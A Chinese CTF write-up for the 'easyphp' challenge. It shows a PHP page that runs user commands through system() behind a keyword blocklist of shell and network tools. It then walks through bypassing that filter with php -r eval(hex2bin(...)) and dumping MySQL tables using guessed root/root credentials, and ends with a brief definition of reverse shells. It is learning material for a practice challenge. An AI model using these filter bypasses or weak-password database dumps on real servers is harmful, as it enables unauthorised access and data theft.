# easyphp

原题:

[ctfshow原题](https://ctf.show/challenges#simple_php-4329)

题解:

[某csdn博客](https://blog.csdn.net/m0_74428315/article/details/139050718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172235917416800226540698%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172235917416800226540698&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-139050718-null-null.142^v100^pc_search_result_base4&utm_term=siscnsimple_php&spm=1018.2226.3001.4187)

```php
<?php
ini_set('open_basedir', '/var/www/html/');
error_reporting(0);

if(isset($_POST['cmd'])){
    $cmd = escapeshellcmd($_POST['cmd']); 
     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
         system($cmd);
}
}
show_source(__FILE__);
?>
```

## ban
引号 ""
base64, vim, file

escapeshellcmd() 函数会对输入的字符串进行转义，使得其中可能被解释为命令行参数或操作符的字符被正确地处理，从而降低命令注入的风险。
例如，如果用户输入的 cmd 值为 ;rm -rf / 这样的恶意命令，经过 escapeshellcmd() 处理后，系统命令执行函数不会将其视为可执行的恶意命令，而是将其作为普通字符串处理。

[另一篇题解](https://z3r4y.blog.csdn.net/article/details/139052904?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ECtr-1-139052904-blog-139050718.235%5Ev43%5Epc_blog_bottom_relevance_base7&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ECtr-1-139052904-blog-139050718.235%5Ev43%5Epc_blog_bottom_relevance_base7&utm_relevant_index=2)

用php -r进行php代码执行

因为ban了引号，考虑hex2bin，将数字转为字符串

php -r eval(hex2bin(16进制));

## 尝试

cmd=php -r 22706870696e666f28293b22(echo phpinfo();的十六进制编码)

结果:
成功出现回显
Deprecated: Directive 'track_errors' is deprecated in Unknown on line 0 Parse error: syntax error, unexpected 'f28293b22' (T_STRING) in Command line code on line 1 <

substr(_16进制,1) 从第二个字符开始提取字符串

hex2bin(substr(_16进制,1)) 十六进制转二进制

```shell
echo `ls /`
```

发现不存在flag的提示，考虑数据库（经验所得）

那么就得去想办法知道数据库的username和password

那么一般这种情况去尝试弱口令（有些数据库或者后台直接弱口令就出来了）

尝试root 123

注意引号和分号的细节; php语句要加";"

```bash
cmd=php -r echo `mysql -u root -p'root' -e 'show databases;'`;
```

结果:
Database
PHP_CMS
information_schema
mysql
performance_schema
test

```bash
cmd=php -r echo `mysql -u root -p'root' -e 'use PHP_CMS;SHOW TABLES;'`;
```

例如，在 MySQL 的 mysql 命令行客户端中，您可以使用 mysql -e "SELECT * FROM your_table;" 来直接执行指定的 SQL 语句并显示结果。

```bash
echo `mysql -u root -p'root' -e 'use PHP_CMS;select * from F1ag_Se3Re7;'`;
```

## 疑问?

为什么要十六进制转二进制? 答: base64禁了, 所以考虑十六进制; 

为什么要substr()?截断绕过?

## 待学习 反弹shell

[反弹shell](https://blog.csdn.net/weixin_44288604/article/details/111740527)

什么是反弹shell
反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。
